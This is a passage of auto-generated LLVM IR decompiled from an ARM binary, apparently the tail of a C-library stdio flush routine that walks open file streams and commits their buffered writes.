  %v9_16f2c = icmp eq i32 %v2_16f28, %v1_16f2c.pre
  br i1 %v9_16f2c, label %dec_label_pc_16f34, label %dec_label_pc_16f4c

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f34
  %v0_16f48 = load i32, i32* @r4, align 4
  store i32 %v0_16f48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %dec_label_pc_16f1c, %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge, %dec_label_pc_16f48
  %v0_16f4c = phi i32 [ %v0_16f48, %dec_label_pc_16f48 ], [ %v2_16f28124, %dec_label_pc_16f1c ], [ %v2_16f28, %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge ]
  %v1_16f4c = phi i32 [ %v0_16f48, %dec_label_pc_16f48 ], [ 0, %dec_label_pc_16f1c ], [ %v1_16f2c.pre, %dec_label_pc_16f34.dec_label_pc_16f28_crit_edge ]
  %v3_16f4c = icmp uge i32 %v0_16f4c, %v1_16f4c
  store i1 %v3_16f4c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f4c = icmp eq i32 %v0_16f4c, %v1_16f4c
  br i1 %v9_16f4c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16f4c
  %v1_16f50 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16f50, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16f4c, %bb67
  %v1_16f54 = xor i1 %v9_16f4c, true
  call void @__pseudo_cond_branch(i1 %v1_16f54, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16f58 = load i32, i32* %r8.global-to-local, align 4
  %v1_16f58 = load i32, i32* %r5.global-to-local, align 4
  %v2_16f58 = add i32 %v1_16f58, 8
  %v3_16f58 = inttoptr i32 %v2_16f58 to i32*
  store i32 %v0_16f58, i32* %v3_16f58, align 4
  %v0_16f60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f08, %bb68
  %v0_16f6c = phi i32 [ %v0_16f0c, %dec_label_pc_16f08 ], [ %v0_16f60.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16f60 = add i32 %v0_16f6c, 152
  %v3_16f60 = inttoptr i32 %v2_16f60 to i32*
  %v4_16f60 = load i32, i32* %v3_16f60, align 4
  store i32 %v4_16f60, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16f68 = add i32 %v4_16f60, 4
  %v2_16f68 = inttoptr i32 %v1_16f68 to i32*
  %v3_16f68 = load i32, i32* %v2_16f68, align 4
  store i32 %v3_16f68, i32* %r1.global-to-local, align 4
  %v2_16f6c = add i32 %v0_16f6c, 76
  %v3_16f6c = inttoptr i32 %v2_16f6c to i32*
  %v4_16f6c = load i32, i32* %v3_16f6c, align 4
  store i32 %v4_16f6c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f70 = icmp eq i32 %v3_16f68, 0
  %v1_16f74 = inttoptr i32 %v4_16f6c to i32*
  %v2_16f74 = load i32, i32* %v1_16f74, align 4
  store i32 %v2_16f74, i32* @r5, align 4
  br i1 %v2_16f70, label %dec_label_pc_16f7c, label %dec_label_pc_16fdc

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f5c
  %v2_16f7c = add i32 %v4_16f60, 8
  %v3_16f7c = inttoptr i32 %v2_16f7c to i32*
  store i32 0, i32* %v3_16f7c, align 4
  %v0_16f80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16f80, i32* @r7, align 4
  br label %dec_label_pc_16f84

dec_label_pc_16f84:                               ; preds = %dec_label_pc_16fb4.dec_label_pc_16f84_crit_edge, %dec_label_pc_16f7c
  %v0_16f84 = phi i32 [ %v0_16f84.pre, %dec_label_pc_16fb4.dec_label_pc_16f84_crit_edge ], [ %v0_16f80, %dec_label_pc_16f7c ]
  %v1_16f84 = inttoptr i32 %v0_16f84 to i32*
  %v2_16f84 = load i32, i32* %v1_16f84, align 4
  store i32 %v2_16f84, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16f84, i32* %r2.global-to-local, align 4
  %v2_16f90111 = load i32, i32* %v1_16f84, align 4
  store i32 %v2_16f90111, i32* %r3.global-to-local, align 4
  %v3_16f94113 = icmp uge i32 %v2_16f90111, %v2_16f84
  store i1 %v3_16f94113, i1* %cpsr_c.global-to-local, align 1
  %v9_16f94119 = icmp eq i32 %v2_16f90111, %v2_16f84
  br i1 %v9_16f94119, label %dec_label_pc_16f9c, label %dec_label_pc_16fb4

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f84, %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge
  %v0_16f9c120 = phi i32 [ %v1_16f94.pre, %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge ], [ %v2_16f84, %dec_label_pc_16f84 ]
  store i32 %v0_16f9c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16fac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16fac, label %dec_label_pc_16fb0, label %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge

dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge:  ; preds = %dec_label_pc_16f9c
  %v0_16f90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f94.pre = load i32, i32* @r4, align 4
  %v1_16f90 = inttoptr i32 %v0_16f90.pre to i32*
  %v2_16f90 = load i32, i32* %v1_16f90, align 4
  store i32 %v2_16f90, i32* %r3.global-to-local, align 4
  %v3_16f94 = icmp uge i32 %v2_16f90, %v1_16f94.pre
  store i1 %v3_16f94, i1* %cpsr_c.global-to-local, align 1
  %v9_16f94 = icmp eq i32 %v2_16f90, %v1_16f94.pre
  br i1 %v9_16f94, label %dec_label_pc_16f9c, label %dec_label_pc_16fb4

dec_label_pc_16fb0:                               ; preds = %dec_label_pc_16f9c
  %v0_16fb0 = load i32, i32* @r4, align 4
  store i32 %v0_16fb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16f84, %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge, %dec_label_pc_16fb0
  %v0_16fbc = phi i32 [ %v0_16fb0, %dec_label_pc_16fb0 ], [ %v2_16f90111, %dec_label_pc_16f84 ], [ %v2_16f90, %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge ]
  %v1_16fb4 = phi i32 [ %v0_16fb0, %dec_label_pc_16fb0 ], [ %v2_16f84, %dec_label_pc_16f84 ], [ %v1_16f94.pre, %dec_label_pc_16f9c.dec_label_pc_16f90_crit_edge ]
  %v3_16fb4 = icmp uge i32 %v0_16fbc, %v1_16fb4
  store i1 %v3_16fb4, i1* %cpsr_c.global-to-local, align 1
  %v9_16fb4 = icmp eq i32 %v0_16fbc, %v1_16fb4
  br i1 %v9_16fb4, label %dec_label_pc_16fbc, label %dec_label_pc_16fb4.dec_label_pc_16f84_crit_edge

dec_label_pc_16fb4.dec_label_pc_16f84_crit_edge:  ; preds = %dec_label_pc_16fb4
  %v0_16f84.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16f84

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16fb4
  %v2_16fbc = icmp ne i32 %v1_16fb4, 0
  store i1 %v2_16fbc, i1* %cpsr_c.global-to-local, align 1
  %v7_16fc0 = icmp slt i32 %v1_16fb4, 2
  br i1 %v7_16fc0, label %dec_label_pc_16fdcthread-pre-split, label %dec_label_pc_16fc4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16fbc
  %v0_16fc4 = load i32, i32* @r7, align 4
  store i32 %v0_16fc4, i32* %r0.global-to-local, align 4
  %v0_16fc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fc8 = add i32 %v0_16fc8, 129
  store i32 %v1_16fc8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fdcthread-pre-split

dec_label_pc_16fdcthread-pre-split:               ; preds = %dec_label_pc_16fbc, %dec_label_pc_16fc4
  %v0_17128.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16fdcthread-pre-split, %dec_label_pc_16f5c
  %v0_17128.pr = phi i32 [ %v0_17128.pr.pr, %dec_label_pc_16fdcthread-pre-split ], [ %v2_16f74, %dec_label_pc_16f5c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1712818 = icmp eq i32 %v0_17128.pr, 0
  br i1 %v2_1712818, label %dec_label_pc_17130, label %dec_label_pc_16fec

dec_label_pc_16fec:                               ; preds = %dec_label_pc_16fdc, %dec_label_pc_17124
  %v0_17014 = phi i32 [ %v3_17124, %dec_label_pc_17124 ], [ %v0_17128.pr, %dec_label_pc_16fdc ]
  %v1_16fec = inttoptr i32 %v0_17014 to i16*
  %v2_16fec = load i16, i16* %v1_16fec, align 2
  %v3_16fec = zext i16 %v2_16fec to i32
  store i32 %v3_16fec, i32* %r3.global-to-local, align 4
  %v1_16ff0 = and i32 %v3_16fec, 64
  %v2_16ff0 = icmp eq i32 %v1_16ff0, 0
  br i1 %v2_16ff0, label %dec_label_pc_17124, label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16fec
  %v0_16ff8 = load i32, i32* @r6, align 4
  %v1_16ff8 = load i32, i32* %sb.global-to-local, align 4
  %v2_16ff8 = add i32 %v1_16ff8, %v0_16ff8
  %v3_16ff8 = inttoptr i32 %v2_16ff8 to i32*
  %v4_16ff8 = load i32, i32* %v3_16ff8, align 4
  store i32 %v4_16ff8, i32* %r3.global-to-local, align 4
  %v1_16ffc = inttoptr i32 %v4_16ff8 to i32*
  %v2_16ffc = load i32, i32* %v1_16ffc, align 4
  store i32 %v2_16ffc, i32* %r3.global-to-local, align 4
  %v2_17000 = icmp ugt i32 %v2_16ffc, 1
  store i1 %v2_17000, i1* %cpsr_c.global-to-local, align 1
  %v7_17000 = icmp eq i32 %v2_16ffc, 2
  br i1 %v7_17000, label %dec_label_pc_17064, label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %dec_label_pc_16ff8
  %v1_17008 = add i32 %v0_17014, 64
  %v2_17008 = inttoptr i32 %v1_17008 to i32*
  %v3_17008 = load i32, i32* %v2_17008, align 4
  store i32 %v3_17008, i32* %r3.global-to-local, align 4
  %v1_1700c = load i32, i32* %r8.global-to-local, align 4
  %v3_1700c = icmp uge i32 %v3_17008, %v1_1700c
  store i1 %v3_1700c, i1* %cpsr_c.global-to-local, align 1
  %v9_1700c = icmp eq i32 %v3_17008, %v1_1700c
  br i1 %v9_1700c, label %dec_label_pc_17058, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_17008
  %v1_17014 = add i32 %v0_17014, 56
  store i32 %v1_17014, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17014, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1702486 = inttoptr i32 %v1_17014 to i32*
  %v2_1702487 = load i32, i32* %v1_1702486, align 4
  store i32 %v2_1702487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1702894 = icmp eq i32 %v2_1702487, 0
  br i1 %v9_1702894, label %dec_label_pc_17030, label %dec_label_pc_17048

dec_label_pc_17030:                               ; preds = %dec_label_pc_17014, %dec_label_pc_17030.dec_label_pc_17024_crit_edge
  %v0_1703095 = phi i32 [ %v1_17028.pre, %dec_label_pc_17030.dec_label_pc_17024_crit_edge ], [ 0, %dec_label_pc_17014 ]
  store i32 %v0_1703095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17040 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17040, label %dec_label_pc_17044, label %dec_label_pc_17030.dec_label_pc_17024_crit_edge

dec_label_pc_17030.dec_label_pc_17024_crit_edge:  ; preds = %dec_label_pc_17030
  %v0_17024.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17028.pre = load i32, i32* @r4, align 4
  %v1_17024 = inttoptr i32 %v0_17024.pre to i32*
  %v2_17024 = load i32, i32* %v1_17024, align 4
  store i32 %v2_17024, i32* %r3.global-to-local, align 4
  %v3_17028 = icmp uge i32 %v2_17024, %v1_17028.pre
  store i1 %v3_17028, i1* %cpsr_c.global-to-local, align 1
  %v9_17028 = icmp eq i32 %v2_17024, %v1_17028.pre
  br i1 %v9_17028, label %dec_label_pc_17030, label %dec_label_pc_17048

dec_label_pc_17044:                               ; preds = %dec_label_pc_17030
  %v0_17044 = load i32, i32* @r4, align 4
  store i32 %v0_17044, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_17014, %dec_label_pc_17030.dec_label_pc_17024_crit_edge, %dec_label_pc_17044
  %v0_17048 = phi i32 [ %v0_17044, %dec_label_pc_17044 ], [ %v2_1702487, %dec_label_pc_17014 ], [ %v2_17024, %dec_label_pc_17030.dec_label_pc_17024_crit_edge ]
  %v1_17048 = phi i32 [ %v0_17044, %dec_label_pc_17044 ], [ 0, %dec_label_pc_17014 ], [ %v1_17028.pre, %dec_label_pc_17030.dec_label_pc_17024_crit_edge ]
  %v3_17048 = icmp uge i32 %v0_17048, %v1_17048
  store i1 %v3_17048, i1* %cpsr_c.global-to-local, align 1
  %v9_17048 = icmp eq i32 %v0_17048, %v1_17048
  br i1 %v9_17048, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17048
  %v1_1704c = load i32, i32* @r7, align 4
  store i32 %v1_1704c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17048, %bb69
  %v1_17050 = xor i1 %v9_17048, true
  call void @__pseudo_cond_branch(i1 %v1_17050, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_17054 = load i32, i32* %r8.global-to-local, align 4
  %v1_17054 = load i32, i32* @r5, align 4
  %v2_17054 = add i32 %v1_17054, 64
  %v3_17054 = inttoptr i32 %v2_17054 to i32*
  store i32 %v0_17054, i32* %v3_17054, align 4
  %v0_17058.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17058

dec_label_pc_17058:                               ; preds = %dec_label_pc_17008, %bb70
  %v0_17058 = phi i32 [ %v0_17014, %dec_label_pc_17008 ], [ %v0_17058.pre, %bb70 ]
  %v1_17058 = add i32 %v0_17058, 60
  %v2_17058 = inttoptr i32 %v1_17058 to i32*
  %v3_17058 = load i32, i32* %v2_17058, align 4
  %v1_1705c = add i32 %v3_17058, 1
  store i32 %v1_1705c, i32* %r3.global-to-local, align 4
  store i32 %v1_1705c, i32* %v2_17058, align 4
  %v0_17064.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17064

dec_label_pc_17064:                               ; preds = %dec_label_pc_16ff8, %dec_label_pc_17058
  %v0_1707c = phi i32 [ %v0_17014, %dec_label_pc_16ff8 ], [ %v0_17064.pre, %dec_label_pc_17058 ]
  %v1_17064 = inttoptr i32 %v0_1707c to i16*
  %v2_17064 = load i16, i16* %v1_17064, align 2
  %v3_17064 = zext i16 %v2_17064 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1706c = or i32 %v3_17064, %stack_var_-44.1
  %v1_17070 = xor i32 %v2_1706c, 320
  store i32 %v1_17070, i32* %r3.global-to-local, align 4
  %v1_17074 = and i32 %v1_17070, 832
  %v2_17074 = icmp eq i32 %v1_17074, 0
  br i1 %v2_17074, label %dec_label_pc_1707c, label %bb71

dec_label_pc_1707c:                               ; preds = %dec_label_pc_17064
  store i32 %v0_1707c, i32* %r0.global-to-local, align 4
  %v1_17080 = call i32 @__stdio_wcommit(i32 %v0_1707c)
  store i32 %v1_17080, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17084 = icmp eq i32 %v1_17080, 0
  br i1 %v2_17084, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1707c
  %v1_17088 = load i32, i32* @r5, align 4
  %v2_17088 = inttoptr i32 %v1_17088 to i16*
  %v3_17088 = load i16, i16* %v2_17088, align 2
  %v4_17088 = zext i16 %v3_17088 to i32
  store i32 %v4_17088, i32* %r3.global-to-local, align 4
  %v2_1708c = add i32 %v1_17088, 8
  %v3_1708c = inttoptr i32 %v2_1708c to i32*
  %v4_1708c = load i32, i32* %v3_1708c, align 4
  store i32 %v4_1708c, i32* %r2.global-to-local, align 4
  %v2_17090 = and i32 %v4_17088, 65471
  store i32 %v2_17090, i32* %r3.global-to-local, align 4
  %v3_17094 = add i32 %v1_17088, 28
  %v4_17094 = inttoptr i32 %v3_17094 to i32*
  store i32 %v4_1708c, i32* %v4_17094, align 4
  %v1_17098 = load i32, i32* %r3.global-to-local, align 4
  %v2_17098 = trunc i32 %v1_17098 to i16
  %v3_17098 = load i32, i32* @r5, align 4
  %v4_17098 = inttoptr i32 %v3_17098 to i16*
  store i16 %v2_17098, i16* %v4_17098, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1707c
  %v1_1709c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1709c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17064, %.thread7
  %v0_170a0 = load i32, i32* @r6, align 4
  %v1_170a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_170a0 = add i32 %v1_170a0, %v0_170a0
  %v3_170a0 = inttoptr i32 %v2_170a0 to i32*
  %v4_170a0 = load i32, i32* %v3_170a0, align 4
  store i32 %v4_170a0, i32* %r3.global-to-local, align 4
  %v1_170a4 = inttoptr i32 %v4_170a0 to i32*
  %v2_170a4 = load i32, i32* %v1_170a4, align 4
  store i32 %v2_170a4, i32* %r3.global-to-local, align 4
  %v2_170a8 = icmp ugt i32 %v2_170a4, 1
  store i1 %v2_170a8, i1* %cpsr_c.global-to-local, align 1
  %v7_170a8 = icmp eq i32 %v2_170a4, 2
  br i1 %v7_170a8, label %dec_label_pc_17124, label %dec_label_pc_170b0

dec_label_pc_170b0:                               ; preds = %bb71
  %v0_170b0 = load i32, i32* @r5, align 4
  %v1_170b0 = add i32 %v0_170b0, 60
  %v2_170b0 = inttoptr i32 %v1_170b0 to i32*
  %v3_170b0 = load i32, i32* %v2_170b0, align 4
  %v1_170b4 = add i32 %v3_170b0, -1
  store i32 %v1_170b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170b8 = icmp eq i32 %v1_170b4, 0
  store i32 %v1_170b4, i32* %v2_170b0, align 4
  br i1 %v2_170b8, label %dec_label_pc_170c4, label %dec_label_pc_17124

dec_label_pc_170c4:                               ; preds = %dec_label_pc_170b0
  %v0_170c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_170c4 = load i32, i32* @r5, align 4
  %v2_170c4 = add i32 %v1_170c4, 64
  %v3_170c4 = inttoptr i32 %v2_170c4 to i32*
  store i32 %v0_170c4, i32* %v3_170c4, align 4
  %v0_170c8 = load i32, i32* @r5, align 4
  %v1_170c8 = add i32 %v0_170c8, 56
  store i32 %v1_170c8, i32* @r7, align 4
  br label %dec_label_pc_170cc

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170fc.dec_label_pc_170cc_crit_edge, %dec_label_pc_170c4
  %v0_170d4 = phi i32 [ %v0_170d4.pre, %dec_label_pc_170fc.dec_label_pc_170cc_crit_edge ], [ %v1_170c8, %dec_label_pc_170c4 ]
  %v0_170cc = phi i32 [ %v0_170cc.pre, %dec_label_pc_170fc.dec_label_pc_170cc_crit_edge ], [ %v0_170c8, %dec_label_pc_170c4 ]
  %v1_170cc = add i32 %v0_170cc, 56
  %v2_170cc = inttoptr i32 %v1_170cc to i32*
  %v3_170cc = load i32, i32* %v2_170cc, align 4
  store i32 %v3_170cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_170d4, i32* %r2.global-to-local, align 4
  %v1_170d897 = inttoptr i32 %v0_170d4 to i32*
  %v2_170d898 = load i32, i32* %v1_170d897, align 4
  store i32 %v2_170d898, i32* %r3.global-to-local, align 4
  %v3_170dc100 = icmp uge i32 %v2_170d898, %v3_170cc
  store i1 %v3_170dc100, i1* %cpsr_c.global-to-local, align 1
  %v9_170dc106 = icmp eq i32 %v2_170d898, %v3_170cc
  br i1 %v9_170dc106, label %dec_label_pc_170e4, label %dec_label_pc_170fc

dec_label_pc_170e4:                               ; preds = %dec_label_pc_170cc, %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge
  %v0_170e4107 = phi i32 [ %v1_170dc.pre, %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge ], [ %v3_170cc, %dec_label_pc_170cc ]
  store i32 %v0_170e4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_170f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_170f4, label %dec_label_pc_170f8, label %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge

dec_label_pc_170e4.dec_label_pc_170d8_crit_edge:  ; preds = %dec_label_pc_170e4
  %v0_170d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_170dc.pre = load i32, i32* @r4, align 4
  %v1_170d8 = inttoptr i32 %v0_170d8.pre to i32*
  %v2_170d8 = load i32, i32* %v1_170d8, align 4
  store i32 %v2_170d8, i32* %r3.global-to-local, align 4
  %v3_170dc = icmp uge i32 %v2_170d8, %v1_170dc.pre
  store i1 %v3_170dc, i1* %cpsr_c.global-to-local, align 1
  %v9_170dc = icmp eq i32 %v2_170d8, %v1_170dc.pre
  br i1 %v9_170dc, label %dec_label_pc_170e4, label %dec_label_pc_170fc

dec_label_pc_170f8:                               ; preds = %dec_label_pc_170e4
  %v0_170f8 = load i32, i32* @r4, align 4
  store i32 %v0_170f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170cc, %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge, %dec_label_pc_170f8
  %v0_17104 = phi i32 [ %v0_170f8, %dec_label_pc_170f8 ], [ %v2_170d898, %dec_label_pc_170cc ], [ %v2_170d8, %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge ]
  %v1_170fc = phi i32 [ %v0_170f8, %dec_label_pc_170f8 ], [ %v3_170cc, %dec_label_pc_170cc ], [ %v1_170dc.pre, %dec_label_pc_170e4.dec_label_pc_170d8_crit_edge ]
  %v3_170fc = icmp uge i32 %v0_17104, %v1_170fc
  store i1 %v3_170fc, i1* %cpsr_c.global-to-local, align 1
  %v9_170fc = icmp eq i32 %v0_17104, %v1_170fc
  br i1 %v9_170fc, label %dec_label_pc_17104, label %dec_label_pc_170fc.dec_label_pc_170cc_crit_edge

dec_label_pc_170fc.dec_label_pc_170cc_crit_edge:  ; preds = %dec_label_pc_170fc
  %v0_170cc.pre = load i32, i32* @r5, align 4
  %v0_170d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_170cc

dec_label_pc_17104:                               ; preds = %dec_label_pc_170fc
  %v2_17104 = icmp ne i32 %v1_170fc, 0
  store i1 %v2_17104, i1* %cpsr_c.global-to-local, align 1
  %v7_17108 = icmp slt i32 %v1_170fc, 2
  br i1 %v7_17108, label %dec_label_pc_17124, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_17104
  %v0_1710c = load i32, i32* @r5, align 4
  %v1_1710c = add i32 %v0_1710c, 56
  store i32 %v1_1710c, i32* %r0.global-to-local, align 4
  %v0_17110 = load i32, i32* %r1.global-to-local, align 4
  %v1_17110 = add i32 %v0_17110, 129
  store i32 %v1_17110, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17124

dec_label_pc_17124:                               ; preds = %dec_label_pc_170b0, %dec_label_pc_1710c, %dec_label_pc_17104, %bb71, %dec_label_pc_16fec
  %v0_17124 = load i32, i32* @r5, align 4
  %v1_17124 = add i32 %v0_17124, 32
  %v2_17124 = inttoptr i32 %v1_17124 to i32*
  %v3_17124 = load i32, i32* %v2_17124, align 4
  store i32 %v3_17124, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17128 = icmp eq i32 %v3_17124, 0
  br i1 %v2_17128, label %dec_label_pc_17130, label %dec_label_pc_16fec

dec_label_pc_17130:                               ; preds = %dec_label_pc_17124, %dec_label_pc_16fdc
  %v0_17130 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17130, i32* %r0.global-to-local, align 4
  %v0_1716c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17138:                               ; preds = %dec_label_pc_16e14
  %v3_17138 = load i16, i16* %arg1, align 2
  %v4_17138 = zext i16 %v3_17138 to i32
  %v1_1713c = and i32 %v4_17138, 64
  store i32 %v1_1713c, i32* %r3.global-to-local, align 4
  %v2_1713c = icmp eq i32 %v1_1713c, 0
  br i1 %v2_1713c, label %bb72, label %dec_label_pc_17148

bb72:                                             ; preds = %dec_label_pc_17138
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17148:                               ; preds = %dec_label_pc_17138
  %v2_17148 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17148, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1714c = icmp eq i32 %v2_17148, 0
  br i1 %v2_1714c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17148
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17148
  %v1_17150 = load i32, i32* @r4, align 4
  %v2_17150 = inttoptr i32 %v1_17150 to i16*
  %v3_17150 = load i16, i16* %v2_17150, align 2
  %v4_17150 = zext i16 %v3_17150 to i32
  store i32 %v4_17150, i32* %r3.global-to-local, align 4
  %v2_17154 = add i32 %v1_17150, 8
  %v3_17154 = inttoptr i32 %v2_17154 to i32*
  %v4_17154 = load i32, i32* %v3_17154, align 4
  store i32 %v4_17154, i32* %r2.global-to-local, align 4
  %v2_17158 = and i32 %v4_17150, 65471
  store i32 %v2_17158, i32* %r3.global-to-local, align 4
  %v2_1715c = trunc i32 %v2_17158 to i16
  store i16 %v2_1715c, i16* %v2_17150, align 2
  %v1_17160 = load i32, i32* %r2.global-to-local, align 4
  %v2_17160 = load i32, i32* @r4, align 4
  %v3_17160 = add i32 %v2_17160, 28
  %v4_17160 = inttoptr i32 %v3_17160 to i32*
  store i32 %v1_17160, i32* %v4_17160, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17130, %.thread14
  %v0_1716c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1716c.pre, %dec_label_pc_17130 ], [ 0, %.thread14 ]
  store i32 %v0_1716c, i32* %r0.global-to-local, align 4
  store i32 %v6_16de8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1716c

; uselistorder directives
  uselistorder i32 %v0_1716c, { 1, 0 }
  uselistorder i32 %v3_17124, { 1, 2, 0 }
  uselistorder i32 %v0_170f8, { 1, 0, 2 }
  uselistorder i32 %v1_170dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1707c, { 1, 0, 2 }
  uselistorder i32 %v0_17044, { 1, 0, 2 }
  uselistorder i32 %v1_17028.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1700c, { 1, 0 }
  uselistorder i32 %v0_16fb0, { 1, 0, 2 }
  uselistorder i32 %v1_16f94.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16f84, { 1, 0 }
  uselistorder i32 %v0_16f48, { 1, 0, 2 }
  uselistorder i32 %v1_16f2c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16f14, { 1, 0 }
  uselistorder i32 %v0_16edc, { 1, 0, 2 }
  uselistorder i32 %v1_16ec0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16eb0, { 1, 0 }
  uselistorder i32 %v0_16e6c, { 1, 0, 2 }
  uselistorder i32 %v1_16e50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16e28, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 24, 25, 26, 27, 29, 28, 54, 30, 31, 32, 33, 35, 34, 0, 36, 37, 38, 39, 41, 40, 55, 42, 43, 44, 45, 47, 46, 1, 48, 49, 52, 50, 51 }
